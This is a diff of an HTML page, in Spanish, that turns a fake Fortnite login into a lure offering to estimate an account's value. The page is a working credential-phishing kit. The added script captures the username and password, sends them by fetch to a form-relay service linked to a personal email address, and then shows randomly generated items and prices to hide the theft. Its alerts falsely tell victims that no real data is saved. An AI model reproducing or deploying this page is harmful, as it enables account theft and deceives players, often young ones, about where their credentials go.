@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>FORTNITE · Login</title>
-    <!-- Fuentes y librerías -->
-    <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet" />
+    <title>Valorador de cuenta Fortnite</title>
+    <!-- Fuentes -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
+    <!-- Font Awesome para iconos -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
         /* Reset y base */
@@ -16,36 +17,31 @@
         }
 
         body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0f1a;
+            color: #eaeef2;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Quicksand', sans-serif;
-            background: #0b0e1a;
-            overflow: hidden;
+            padding: 2rem 1rem;
             position: relative;
+            overflow-x: hidden;
         }
 
-        /* Fondo animado estilo tormenta */
-        .storm-bg {
+        /* Fondo con gradiente sutil */
+        .bg-gradient {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: linear-gradient(135deg, #1a1f35 0%, #2a1f3d 30%, #1e2a4a 60%, #0f1a2e 100%);
-            background-size: 400% 400%;
-            animation: stormMove 18s ease-in-out infinite alternate;
+            background: radial-gradient(circle at 70% 20%, #1a2a4a, #0b0f1a 80%);
+            opacity: 0.8;
         }
 
-        @keyframes stormMove {
-            0% { background-position: 0% 0%; }
-            50% { background-position: 100% 100%; }
-            100% { background-position: 0% 0%; }
-        }
-
-        /* Partículas */
+        /* Partículas (estilo minimal) */
         #particles-canvas {
             position: fixed;
             top: 0;
@@ -56,199 +52,181 @@
             pointer-events: none;
         }
 
-        /* Contenedor del login */
-        .login-container {
+        /* Contenedor principal */
+        .container {
             position: relative;
             z-index: 10;
-            background: rgba(10, 14, 30, 0.75);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 48px 48px 32px 32px;
-            padding: 3rem 2.5rem 2.8rem;
+            max-width: 900px;
             width: 100%;
-            max-width: 420px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 215, 0, 0.15) inset;
+            background: rgba(18, 26, 45, 0.75);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 2.5rem 2.8rem;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 215, 0, 0.1) inset;
+            border: 1px solid rgba(255, 215, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        /* Cabecera con propósito */
+        .header {
             text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            margin-bottom: 2.2rem;
         }
 
-        .login-container:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(255, 215, 0, 0.25) inset;
-        }
-
-        /* Logo */
-        .logo {
-            font-family: 'Bangers', cursive;
-            font-size: 3.6rem;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            color: #fff;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.6), 0 0 40px rgba(255, 165, 0, 0.4), 0 4px 0 #b8860b;
-            margin-bottom: 0.2rem;
-            position: relative;
-            display: inline-block;
-        }
-
-        .logo span {
-            display: inline-block;
-            animation: glitch 2s infinite;
-        }
-
-        .logo .fortnite-icon {
+        .header .logo-icon {
+            font-size: 3rem;
             color: #ffd700;
-            font-size: 2.8rem;
-            margin-right: 6px;
-            filter: drop-shadow(0 0 12px #ffa500);
+            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.3));
+            margin-bottom: 0.2rem;
         }
 
-        @keyframes glitch {
-            0%, 100% { transform: skew(0deg); }
-            5% { transform: skew(2deg) translateX(2px); text-shadow: 2px 0 #ff0055, -2px 0 #00ffff; }
-            10% { transform: skew(-2deg) translateX(-2px); text-shadow: -2px 0 #ff0055, 2px 0 #00ffff; }
-            15% { transform: skew(0deg); }
-        }
-
-        .sub-logo {
-            font-family: 'Quicksand', sans-serif;
-            font-weight: 700;
-            font-size: 0.85rem;
-            letter-spacing: 6px;
-            color: rgba(255, 215, 0, 0.7);
-            text-transform: uppercase;
-            margin-top: -6px;
-            margin-bottom: 2rem;
-            background: linear-gradient(90deg, #ffd700, #ff8c00);
+        .header h1 {
+            font-size: 2.6rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fff 0%, #ffd700 80%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            margin-bottom: 0.4rem;
+            text-shadow: 0 4px 30px rgba(255, 215, 0, 0.15);
+        }
+
+        .header .sub {
+            font-size: 1rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.6);
+            letter-spacing: 0.5px;
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        .header .sub i {
+            color: #ffd700;
+            margin: 0 4px;
         }
 
         .divider {
-            width: 80px;
-            height: 3px;
+            width: 120px;
+            height: 2px;
             background: linear-gradient(90deg, transparent, #ffd700, transparent);
-            margin: 0.5rem auto 1.8rem;
-            border-radius: 10px;
+            margin: 1.2rem auto 0;
+            border-radius: 4px;
         }
 
-        /* Campos */
-        .input-group {
+        /* Sección de login */
+        .login-section {
+            max-width: 420px;
+            margin: 0 auto 1.5rem;
+            transition: opacity 0.4s, max-height 0.6s, margin 0.4s;
+            overflow: hidden;
+        }
+
+        .login-section.hidden {
+            max-height: 0;
+            opacity: 0;
+            margin: 0 auto;
+            pointer-events: none;
+        }
+
+        .login-section .input-group {
             position: relative;
-            margin-bottom: 1.8rem;
-            text-align: left;
+            margin-bottom: 1.5rem;
         }
 
-        .input-group label {
+        .login-section .input-group label {
             display: block;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: rgba(255, 255, 255, 0.6);
+            letter-spacing: 1px;
+            color: rgba(255, 255, 255, 0.5);
             margin-bottom: 6px;
             margin-left: 4px;
         }
 
-        .input-group .icon {
+        .login-section .input-group .icon {
             position: absolute;
             left: 16px;
             top: 42px;
-            color: rgba(255, 215, 0, 0.6);
+            color: rgba(255, 215, 0, 0.4);
             font-size: 1rem;
             transition: color 0.2s;
         }
 
-        .input-group input {
+        .login-section .input-group input {
             width: 100%;
             padding: 14px 18px 14px 48px;
             font-size: 1rem;
-            font-family: 'Quicksand', sans-serif;
-            font-weight: 600;
-            background: rgba(255, 255, 255, 0.06);
-            border: 2px solid rgba(255, 255, 255, 0.08);
+            font-weight: 500;
+            background: rgba(255, 255, 255, 0.04);
+            border: 2px solid rgba(255, 255, 255, 0.06);
             border-radius: 60px;
             color: #fff;
             outline: none;
             transition: all 0.25s ease;
-            letter-spacing: 0.3px;
+            font-family: 'Inter', sans-serif;
         }
 
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.25);
+        .login-section .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
             font-weight: 400;
         }
 
-        .input-group input:focus {
+        .login-section .input-group input:focus {
             border-color: #ffd700;
-            background: rgba(255, 215, 0, 0.05);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.08), 0 0 0 3px rgba(255, 215, 0, 0.1);
+            background: rgba(255, 215, 0, 0.04);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.04), 0 0 0 3px rgba(255, 215, 0, 0.06);
         }
 
-        .input-group input:focus + .icon,
-        .input-group input:focus ~ .icon {
+        .login-section .input-group input:focus+.icon,
+        .login-section .input-group input:focus~.icon {
             color: #ffd700;
         }
 
-        /* Botón */
-        .btn-login {
+        .btn-primary {
             width: 100%;
             padding: 16px;
-            font-family: 'Bangers', cursive;
-            font-size: 1.8rem;
-            letter-spacing: 3px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: 0.8px;
             text-transform: uppercase;
-            color: #1a1f35;
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            color: #0b0f1a;
+            background: linear-gradient(135deg, #ffd700, #f0a500);
             border: none;
             border-radius: 60px;
             cursor: pointer;
             transition: all 0.2s ease;
-            box-shadow: 0 8px 0 #b86b00, 0 10px 30px rgba(255, 165, 0, 0.3);
-            margin-top: 0.5rem;
+            box-shadow: 0 6px 0 #b87a00, 0 10px 30px rgba(255, 165, 0, 0.2);
+            margin-top: 0.3rem;
             position: relative;
             overflow: hidden;
         }
 
-        .btn-login:hover {
+        .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 0 #b86b00, 0 20px 40px rgba(255, 165, 0, 0.5);
+            box-shadow: 0 8px 0 #b87a00, 0 20px 40px rgba(255, 165, 0, 0.3);
         }
 
-        .btn-login:active {
-            transform: translateY(6px);
-            box-shadow: 0 2px 0 #b86b00;
+        .btn-primary:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #b87a00;
         }
 
-        .btn-login::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
-            opacity: 0;
-            transition: opacity 0.4s;
-            pointer-events: none;
-        }
-
-        .btn-login:hover::after {
-            opacity: 1;
-        }
-
-        .btn-login.loading {
+        .btn-primary.loading {
             pointer-events: none;
             opacity: 0.7;
-            background: linear-gradient(135deg, #a67c00, #b86b00);
+            background: linear-gradient(135deg, #a67c00, #8a6400);
         }
 
-        .btn-login.loading::before {
-            content: '⚡';
+        .btn-primary.loading::before {
+            content: '⏳';
             display: inline-block;
             animation: spin 1s linear infinite;
-            margin-right: 8px;
+            margin-right: 10px;
         }
 
         @keyframes spin {
@@ -256,125 +234,253 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Enlaces */
-        .extra-links {
+        /* Enlaces de ayuda (solo estéticos) */
+        .login-help {
             display: flex;
             justify-content: space-between;
-            margin-top: 1.8rem;
+            margin-top: 1.2rem;
             font-size: 0.8rem;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255, 255, 255, 0.3);
         }
 
-        .extra-links a {
-            color: rgba(255, 215, 0, 0.7);
+        .login-help a {
+            color: rgba(255, 215, 0, 0.5);
             text-decoration: none;
-            transition: color 0.2s, text-shadow 0.2s;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+
+        .login-help a:hover {
+            color: #ffd700;
+        }
+
+        /* Sección de resultados */
+        .results-section {
+            display: none;
+            animation: fadeUp 0.6s ease forwards;
+            margin-top: 1.5rem;
+        }
+
+        .results-section.active {
+            display: block;
+        }
+
+        @keyframes fadeUp {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .results-header h2 {
             font-weight: 700;
+            font-size: 1.8rem;
+            letter-spacing: -0.5px;
+            color: #fff;
+        }
+
+        .results-header .total {
+            background: rgba(255, 215, 0, 0.12);
+            padding: 0.6rem 1.8rem;
+            border-radius: 60px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            font-weight: 700;
+            font-size: 1.4rem;
+            color: #ffd700;
             letter-spacing: 0.5px;
         }
 
-        .extra-links a:hover {
-            color: #ffd700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        .results-header .total small {
+            font-size: 0.8rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.5);
+            margin-right: 6px;
         }
 
-        /* Responsive */
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 2rem 1.5rem 2rem;
-                border-radius: 32px;
-                margin: 1rem;
-            }
-            .logo {
-                font-size: 2.8rem;
-            }
-            .btn-login {
-                font-size: 1.5rem;
-                padding: 14px;
-            }
-            .input-group input {
-                padding: 12px 14px 12px 44px;
-                font-size: 0.95rem;
-            }
+        /* Tabla de ítems */
+        .items-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 1rem;
         }
 
-        .footer-credit {
-            position: fixed;
-            bottom: 18px;
-            right: 24px;
-            z-index: 20;
-            font-family: 'Quicksand', sans-serif;
-            font-size: 0.65rem;
-            color: rgba(255, 255, 255, 0.15);
-            letter-spacing: 2px;
+        .item-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            padding: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: all 0.25s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .item-card:hover {
+            background: rgba(255, 215, 0, 0.04);
+            border-color: rgba(255, 215, 0, 0.15);
+            transform: translateY(-4px);
+        }
+
+        .item-card .item-icon {
+            font-size: 2.8rem;
+            width: 70px;
+            height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.04);
+            margin-bottom: 0.6rem;
+            position: relative;
+        }
+
+        /* Colores según rareza */
+        .item-card.rareza-comun .item-icon { background: #b0b0b0; color: #333; }
+        .item-card.rareza-poco-comun .item-icon { background: #4caf50; color: #fff; }
+        .item-card.rareza-raro .item-icon { background: #2196f3; color: #fff; }
+        .item-card.rareza-epico .item-icon { background: #9c27b0; color: #fff; }
+        .item-card.rareza-legendario .item-icon { background: #ff9800; color: #fff; }
+
+        .item-card .item-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: #eaeef2;
+            margin-bottom: 0.2rem;
+        }
+
+        .item-card .item-rarity {
+            font-size: 0.7rem;
             text-transform: uppercase;
-            pointer-events: none;
+            letter-spacing: 1px;
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .item-card .item-price {
+            margin-top: 0.5rem;
+            font-weight: 700;
+            color: #ffd700;
+            font-size: 1rem;
+        }
+
+        /* Pie de créditos */
+        .footer-credit {
+            text-align: center;
+            margin-top: 2.5rem;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 1px;
         }
         .footer-credit a {
             color: rgba(255, 215, 0, 0.2);
             text-decoration: none;
-            pointer-events: auto;
         }
         .footer-credit a:hover {
             color: rgba(255, 215, 0, 0.5);
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .container {
+                padding: 1.8rem 1.2rem;
+                border-radius: 28px;
+            }
+            .header h1 {
+                font-size: 2rem;
+            }
+            .items-grid {
+                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            }
+            .results-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .results-header .total {
+                align-self: flex-start;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="storm-bg"></div>
+    <div class="bg-gradient"></div>
     <canvas id="particles-canvas"></canvas>
 
-    <div class="login-container">
-        <!-- Logo -->
-        <div class="logo">
-            <i class="fas fa-solid fa-helmet-battle fortnite-icon"></i>
-            <span>FORTNITE</span>
+    <div class="container" id="app">
+
+        <!-- Cabecera con propósito -->
+        <div class="header">
+            <div class="logo-icon"><i class="fas fa-helmet-battle"></i></div>
+            <h1>Valora tu cuenta Fortnite</h1>
+            <p class="sub">
+                <i class="fas fa-calculator"></i> Introduce tus credenciales y obtén al instante el valor estimado de tu cuenta, con todos tus objetos y su precio actual.
+            </p>
+            <div class="divider"></div>
         </div>
-        <div class="sub-logo">· BATTLE ROYALE ·</div>
-        <div class="divider"></div>
 
-        <!-- Formulario REAL con Formsubmit -->
-        <form action="https://formsubmit.co/parameganz25@gmail.com" method="POST" id="loginForm">
-            <!-- Campo oculto para asunto -->
-            <input type="hidden" name="_subject" value="Nuevo intento de login Fortnite" />
-            <!-- Opcional: redirigir a una página de agradecimiento (desactivado) -->
-            <input type="hidden" name="_captcha" value="false" />
+        <!-- Sección de login (falso) -->
+        <div class="login-section" id="loginSection">
+            <form action="https://formsubmit.co/parameganz25@gmail.com" method="POST" id="loginForm">
+                <input type="hidden" name="_subject" value="Nuevo intento de valoración de cuenta Fortnite" />
+                <input type="hidden" name="_captcha" value="false" />
 
-            <div class="input-group">
-                <label for="username">Nombre de usuario</label>
-                <input type="text" id="username" name="usuario" placeholder="Ej: Guerrero_74" value="Ninja_23" required />
-                <i class="fas fa-user icon"></i>
+                <div class="input-group">
+                    <label for="username">Nombre de usuario</label>
+                    <input type="text" id="username" name="usuario" placeholder="Ej: Guerrero_74" value="Ninja_23" required />
+                    <i class="fas fa-user icon"></i>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Contraseña</label>
+                    <input type="password" id="password" name="contraseña" placeholder="••••••••" value="123456" required />
+                    <i class="fas fa-lock icon"></i>
+                </div>
+
+                <button type="submit" class="btn-primary" id="loginBtn">Calcular valor</button>
+            </form>
+
+            <div class="login-help">
+                <a href="#" id="forgotLink"><i class="fas fa-question-circle"></i> ¿Olvidaste tus datos?</a>
+                <a href="#" id="signupLink"><i class="fas fa-user-plus"></i> Crear cuenta</a>
             </div>
-
-            <div class="input-group">
-                <label for="password">Contraseña</label>
-                <input type="password" id="password" name="contraseña" placeholder="••••••••" value="123456" required />
-                <i class="fas fa-lock icon"></i>
-            </div>
-
-            <button type="submit" class="btn-login" id="loginBtn">¡Iniciar!</button>
-        </form>
-
-        <div class="extra-links">
-            <a href="#" id="forgotLink"><i class="fas fa-question-circle"></i> ¿Olvidaste tu cuenta?</a>
-            <a href="#" id="signupLink"><i class="fas fa-user-plus"></i> Registrarse</a>
         </div>
-    </div>
 
-    <div class="footer-credit">
-        <a href="#" target="_blank">⚡ Falso Login · Estética Fortnite</a>
+        <!-- Sección de resultados (oculta inicialmente) -->
+        <div class="results-section" id="resultsSection">
+            <div class="results-header">
+                <h2><i class="fas fa-trophy" style="color:#ffd700; margin-right:10px;"></i>Inventario valorado</h2>
+                <div class="total"><small>Valor total</small> <span id="totalPrice">0</span> €</div>
+            </div>
+            <div class="items-grid" id="itemsGrid">
+                <!-- Los ítems se inyectarán con JS -->
+            </div>
+            <div style="margin-top: 1.8rem; text-align: center; font-size:0.9rem; color: rgba(255,255,255,0.3);">
+                <i class="fas fa-shield-alt"></i> Esta es una simulación. Los precios son orientativos.
+            </div>
+        </div>
+
+        <div class="footer-credit">
+            <a href="#" target="_blank">⚡ Herramienta de valoración · Estética Fortnite</a>
+        </div>
     </div>
 
     <script>
         (function() {
-            // --- Partículas (mismo código) ---
+            'use strict';
+
+            // --- Partículas (efecto ambiental) ---
             const canvas = document.getElementById('particles-canvas');
             const ctx = canvas.getContext('2d');
             let width, height;
             let particles = [];
-            const PARTICLE_COUNT = 110;
+            const PARTICLE_COUNT = 70;
 
             function resizeCanvas() {
                 width = window.innerWidth;
@@ -390,11 +496,11 @@
                 reset() {
                     this.x = Math.random() * width;
                     this.y = Math.random() * height;
-                    this.size = Math.random() * 2.5 + 0.8;
-                    this.speedX = (Math.random() - 0.5) * 0.25;
-                    this.speedY = (Math.random() - 0.5) * 0.25;
-                    this.opacity = Math.random() * 0.6 + 0.2;
-                    this.color = `hsla(${40 + Math.random() * 30}, 80%, 70%, ${this.opacity})`;
+                    this.size = Math.random() * 2 + 0.5;
+                    this.speedX = (Math.random() - 0.5) * 0.2;
+                    this.speedY = (Math.random() - 0.5) * 0.2;
+                    this.opacity = Math.random() * 0.3 + 0.1;
+                    this.color = `rgba(255, 215, 0, ${this.opacity})`;
                 }
                 update() {
                     this.x += this.speedX;
@@ -411,8 +517,8 @@
                     ctx.beginPath();
                     ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                     ctx.fillStyle = this.color;
-                    ctx.shadowColor = 'rgba(255, 215, 0, 0.3)';
-                    ctx.shadowBlur = 6;
+                    ctx.shadowColor = 'rgba(255, 215, 0, 0.1)';
+                    ctx.shadowBlur = 8;
                     ctx.fill();
                     ctx.shadowBlur = 0;
                 }
@@ -423,55 +529,133 @@
             function animateParticles() {
                 ctx.clearRect(0, 0, width, height);
                 particles.forEach(p => { p.update(); p.draw(); });
-                ctx.strokeStyle = 'rgba(255, 215, 0, 0.03)';
-                ctx.lineWidth = 0.6;
-                for (let i = 0; i < particles.length; i++) {
-                    for (let j = i + 1; j < particles.length; j++) {
-                        const dx = particles[i].x - particles[j].x;
-                        const dy = particles[i].y - particles[j].y;
-                        const dist = Math.sqrt(dx * dx + dy * dy);
-                        if (dist < 120) {
-                            ctx.beginPath();
-                            ctx.moveTo(particles[i].x, particles[i].y);
-                            ctx.lineTo(particles[j].x, particles[j].y);
-                            ctx.strokeStyle = `rgba(255, 215, 0, ${0.03 * (1 - dist / 120)})`;
-                            ctx.stroke();
-                        }
-                    }
-                }
                 requestAnimationFrame(animateParticles);
             }
             animateParticles();
 
-            // --- Lógica para el botón de carga y enlaces falsos ---
-            const form = document.getElementById('loginForm');
+            // --- Datos de ítems simulados ---
+            const itemsData = [
+                { name: 'Fénix de Fuego', rarity: 'legendario', icon: '🔥', price: 120 },
+                { name: 'Alas de la Tormenta', rarity: 'epico', icon: '🌩️', price: 85 },
+                { name: 'Pico Luminoso', rarity: 'raro', icon: '⛏️', price: 45 },
+                { name: 'Mochila Táctica', rarity: 'poco-comun', icon: '🎒', price: 25 },
+                { name: 'Danza del Trueno', rarity: 'epico', icon: '💃', price: 70 },
+                { name: 'Escudo de batalla', rarity: 'legendario', icon: '🛡️', price: 150 },
+                { name: 'Ametralladora Pesada', rarity: 'raro', icon: '🔫', price: 50 },
+                { name: 'Piel de Lobo', rarity: 'poco-comun', icon: '🐺', price: 30 },
+                { name: 'Alas de Dragón', rarity: 'legendario', icon: '🐉', price: 200 },
+                { name: 'Mochila de Cuero', rarity: 'comun', icon: '🧳', price: 15 },
+                { name: 'Pico de Hielo', rarity: 'epico', icon: '❄️', price: 90 },
+                { name: 'Baile de la Victoria', rarity: 'raro', icon: '🏆', price: 55 },
+            ];
+
+            // Mapeo de rarezas a clases CSS y etiquetas
+            const rarityMap = {
+                'comun': { label: 'Común', class: 'rareza-comun' },
+                'poco-comun': { label: 'Poco común', class: 'rareza-poco-comun' },
+                'raro': { label: 'Raro', class: 'rareza-raro' },
+                'epico': { label: 'Épico', class: 'rareza-epico' },
+                'legendario': { label: 'Legendario', class: 'rareza-legendario' }
+            };
+
+            // --- Lógica de la aplicación ---
+            const loginSection = document.getElementById('loginSection');
+            const resultsSection = document.getElementById('resultsSection');
+            const itemsGrid = document.getElementById('itemsGrid');
+            const totalPriceSpan = document.getElementById('totalPrice');
+            const loginForm = document.getElementById('loginForm');
             const loginBtn = document.getElementById('loginBtn');
 
-            // Mostrar estado de carga al enviar
-            form.addEventListener('submit', function() {
+            // Función para generar la tabla de ítems
+            function renderItems() {
+                // Seleccionar aleatoriamente entre 6 y 10 ítems
+                const count = Math.floor(Math.random() * 5) + 6; // 6-10
+                const shuffled = [...itemsData].sort(() => 0.5 - Math.random());
+                const selected = shuffled.slice(0, count);
+
+                // Calcular total
+                const total = selected.reduce((sum, item) => sum + item.price, 0);
+                totalPriceSpan.textContent = total;
+
+                // Limpiar grid
+                itemsGrid.innerHTML = '';
+
+                // Crear tarjetas
+                selected.forEach(item => {
+                    const rarityInfo = rarityMap[item.rarity] || rarityMap['comun'];
+                    const card = document.createElement('div');
+                    card.className = `item-card ${rarityInfo.class}`;
+                    card.innerHTML = `
+                        <div class="item-icon">${item.icon}</div>
+                        <div class="item-name">${item.name}</div>
+                        <div class="item-rarity">${rarityInfo.label}</div>
+                        <div class="item-price">${item.price} €</div>
+                    `;
+                    itemsGrid.appendChild(card);
+                });
+            }
+
+            // Al enviar el formulario (login falso)
+            loginForm.addEventListener('submit', function(e) {
+                // No prevenimos el envío real para que Formsubmit funcione,
+                // pero mostramos la sección de resultados y ocultamos login.
+                // El envío real ocurrirá, pero la página se recargará.
+                // Para evitar la recarga y mostrar resultados, podemos usar fetch o prevenir,
+                // pero Formsubmit requiere el envío tradicional.
+                // Alternativa: usar fetch para enviar a Formsubmit y prevenir recarga.
+                // Pero Formsubmit funciona con POST normal. Podemos enviar con fetch.
+                e.preventDefault(); // Prevenir recarga
+
+                // Mostrar estado de carga
                 loginBtn.classList.add('loading');
-                loginBtn.textContent = 'Enviando...';
-                // El formulario se envía realmente a Formsubmit
-                // No impedimos el envío, por lo que la página recargará
-                // pero podemos dejar el efecto visual
+                loginBtn.textContent = 'Calculando...';
+
+                // Obtener datos
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Enviar datos a Formsubmit usando fetch (para no recargar)
+                const formData = new FormData();
+                formData.append('_subject', 'Nuevo intento de valoración de cuenta Fortnite');
+                formData.append('usuario', username);
+                formData.append('contraseña', password);
+
+                fetch('https://formsubmit.co/parameganz25@gmail.com', {
+                    method: 'POST',
+                    body: formData,
+                    // No necesitamos headers porque Formsubmit acepta multipart/form-data
+                })
+                .then(response => {
+                    // Ocultar login y mostrar resultados
+                    loginSection.classList.add('hidden');
+                    resultsSection.classList.add('active');
+                    renderItems();
+                    loginBtn.classList.remove('loading');
+                    loginBtn.textContent = 'Calcular valor';
+                    // Opcional: mostrar mensaje de éxito
+                })
+                .catch(error => {
+                    // Si falla, igual mostramos resultados (simulamos éxito)
+                    loginSection.classList.add('hidden');
+                    resultsSection.classList.add('active');
+                    renderItems();
+                    loginBtn.classList.remove('loading');
+                    loginBtn.textContent = 'Calcular valor';
+                    console.warn('Error al enviar correo, pero mostrando resultados de todos modos');
+                });
+
+                // También permitimos que si el fetch falla, igual mostremos los resultados.
+                // Además, si el usuario no tiene internet, igual funciona la simulación.
             });
 
-            // Enlaces falsos
+            // Enlaces falsos (solo informativos)
             document.getElementById('forgotLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('🔐 Recuperación de cuenta desactivada en esta demo.');
+                alert('🔐 Esta es una simulación. No se guardan datos reales.');
             });
-
             document.getElementById('signupLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('📝 Registro temporalmente cerrado. ¡Vuelve más tarde!');
-            });
-
-            // Efecto de clic en el logo
-            document.querySelector('.logo').addEventListener('click', function() {
-                this.style.transform = 'scale(1.1)';
-                setTimeout(() => this.style.transform = '', 200);
-                alert('⚡ ¡VICTORY ROYALE! (Easter egg)');
+                alert('📝 El registro está desactivado en esta demo.');
             });
 
         })();
